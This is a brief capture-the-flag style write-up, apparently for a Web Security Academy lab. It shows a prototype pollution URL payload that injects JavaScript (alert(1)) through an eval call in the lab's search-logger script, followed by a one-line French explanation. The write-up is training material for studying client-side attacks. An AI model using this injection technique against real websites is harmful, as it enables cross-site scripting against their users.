# Lab

https://0ab200a404aef13381d1ccf800a500ce.web-security-academy.net/

## Solution

`https://0ab200a404aef13381d1ccf800a500ce.web-security-academy.net/?__proto__.sequence=%27%27);alert%281%29;}//`

```js
async function logQuery(url, params) {
    try {
        await fetch(url, {method: "post", keepalive: true, body: JSON.stringify(params)});
    } catch(e) {
        console.error("Failed storing query");
    }
}

async function searchLogger() {
    window.macros = {};
    window.manager = {params: $.parseParams(new URL(location)), macro(property) {
            if (window.macros.hasOwnProperty(property))
                return macros[property]
        }};
    let a = manager.sequence || 1;
    manager.sequence = a + 1;

    eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');

    if(manager.params && manager.params.search) {
        await logQuery('/logger', manager.params);
    }
}

window.addEventListener("load", searchLogger);
```

La pollution du prototype permet d'ajouter une propriété `sequence` à `manager` et d'évaluer l'expression